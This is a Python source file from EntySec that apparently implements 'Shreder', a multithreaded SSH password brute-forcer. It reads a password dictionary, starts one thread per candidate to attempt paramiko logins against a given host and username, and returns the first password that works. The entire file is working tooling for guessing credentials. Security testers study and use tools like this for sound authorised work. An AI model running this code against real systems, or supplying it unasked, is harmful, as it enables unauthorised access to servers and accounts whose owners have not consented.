#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import paramiko

from time import sleep as ssh_delay
from threading import Thread as ssh_thread

from .badges import Badges


class Shreder(Badges):
    password = None

    def connect(self, host, port, username, password):
        ssh = paramiko.client.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(host, port=int(port), username=username, password=password)
            self.password = password
        except Exception:
            return
        ssh.close()

    def brute(self, host, port, username, dictionary, delay=0.1):
        with open(dictionary, 'r') as f:
            threads = list()
            lines = f.read().split('\n')

            for password in lines:
                if password.strip():
                    threads.append(
                        ssh_thread(
                            target=self.connect,
                            args=[host, port, username, password]
                        )
                    )

            line = "/-\|"
            counter = 0
            tried = 1

            for thread in threads:
                if not self.password:
                    if counter >= len(line):
                        counter = 0
                    self.print_process(
                        f"Processing... {line[counter]} | Passwords tried: {tried}/{str(len(threads))}", end=''
                    )

                    ssh_delay(delay)
                    thread.start()

                    counter += 1
                    tried += 1
            self.print_empty(end='')

            for thread in threads:
                if thread.is_alive():
                    thread.join()

        return self.password
